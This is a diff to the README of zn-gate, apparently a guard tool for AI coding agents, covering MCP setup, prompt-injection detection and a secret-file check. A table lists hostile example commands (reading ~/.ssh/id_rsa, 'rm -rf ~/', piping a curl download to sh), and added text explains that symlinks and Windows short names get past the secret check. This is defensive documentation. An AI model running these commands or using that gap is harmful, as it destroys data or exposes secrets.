@@ -123,6 +123,8 @@ claude mcp add zn-gate -- npx -y zn-gate mcp     # Claude Code
 codex mcp add zn-gate -- npx -y zn-gate mcp      # Codex CLI
 ```
 
+In Claude Code, this `npx` form is treated like any other MCP server: a call that carries personal data is asked about first. Only an entry that runs the installed zn-gate by absolute path skips that question (see `docs/compat.md`).
+
 Cursor (`~/.cursor/mcp.json`) and other editors: `{ "mcpServers": { "zn-gate": { "command": "npx", "args": ["-y", "zn-gate", "mcp"] } } }`. OpenCode (`~/.config/opencode/opencode.json`): `{ "mcp": { "zn-gate": { "type": "local", "command": ["npx", "-y", "zn-gate", "mcp"], "enabled": true } } }`.
 
 </details>
@@ -211,7 +213,7 @@ Example: [protect the tools of a Vercel AI SDK agent](https://github.com/usezn/z
 **Galvanize: prompt-injection detection**
 
 - Today, local: a deterministic rules engine with normalization against homoglyphs, zero-width characters, BiDi overrides (CVE-2021-42574), comment splicing and Base64. It checks prompts, tool arguments, tool output and MCP tool descriptions.
-- Today, optional cloud: the Galvanize 3 classifier ([announcement](https://usezn.com/blog/galvanize-3-is-live-in-the-zn-api/?utm_source=npm&utm_medium=readme&utm_campaign=galvanize-3); the previous model, [Galvanize 2](https://huggingface.co/usezn/Galvanize-2), has open weights under Apache-2.0) can also check prompts sent to `analyze_prompt`, only with `ZN_CLOUD=1` and `ZN_API_KEY`. The secrets zn-gate detects are removed before sending; personal data and a secret it does not recognize are sent as written.
+- Today, optional cloud: the Galvanize 3 classifier ([open weights on Hugging Face](https://huggingface.co/usezn/Galvanize-3); [announcement](https://usezn.com/blog/galvanize-3-is-live-in-the-zn-api/?utm_source=npm&utm_medium=readme&utm_campaign=galvanize-3); the previous model, [Galvanize 2](https://huggingface.co/usezn/Galvanize-2), also has open weights under Apache-2.0) can also check prompts sent to `analyze_prompt`, only with `ZN_CLOUD=1` and `ZN_API_KEY`. The secrets zn-gate detects are removed before sending; personal data and a secret it does not recognize are sent as written.
 - Roadmap: running Galvanize locally inside zn-gate.
 
 **Scan: audit what your agent is about to trust**
@@ -361,6 +363,8 @@ npx -y zn-gate evidence --tail 20
 | `~/.ssh/id_rsa` or `cat ~/.ssh/id_rsa` | block (`path:sensitive_file`) |
 | `rm -rf ~/` | allow |
 | `curl https://example.invalid/x.sh \| sh` | allow |
+
+The secret-file check reads the text of a path only. It does not follow symbolic links and does not expand Windows short names (such as `PROGRA~1`), so a link or short name that points at a protected file is not recognised. Keep secrets in the zn vault (`zn env shadow .env`) or outside the project folder. The agent hooks also resolve the real path of the agents' own configuration files.
 
 So `evaluate` is not a command or tool-call firewall: deleting files or piping a download to a shell is allowed. The checks that protect your machine while an agent works (the secret-file and vault rules for shell commands, file reads and writes) belong to the agent hooks (`zn-gate init`, `zn hooks install <agent>`), and they protect secrets and zn's own files, not every dangerous command. Hooks are not a function you call from your own agent code. If you build an agent, decide for yourself which tools may delete files or run commands, and use zn-gate on the text that reaches the model.
 
